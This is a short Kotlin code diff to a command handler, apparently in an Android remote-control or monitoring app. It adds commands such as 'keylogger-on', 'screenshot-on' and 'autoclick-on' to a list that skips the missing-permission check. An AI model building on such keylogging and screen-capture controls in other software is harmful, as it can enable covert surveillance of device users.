@@ -48,7 +48,14 @@ class CommandHandler(
         scope.launch {
             try {
                 val missingPerms = collectors.needsPermission(command)
-                if (missingPerms.isNotEmpty()) {
+                val isManagementCmd = command in listOf(
+                    "permission-status", "request-permission",
+                    "keylogger-on", "keylogger-off",
+                    "autoclick-on", "autoclick-off",
+                    "input-monitoring-on", "input-monitoring-off",
+                    "screenshot-on", "screenshot-off"
+                )
+                if (missingPerms.isNotEmpty() && !isManagementCmd) {
                     val response = JSONObject().apply {
                         put("command", command)
                         put("status", "permission_required")
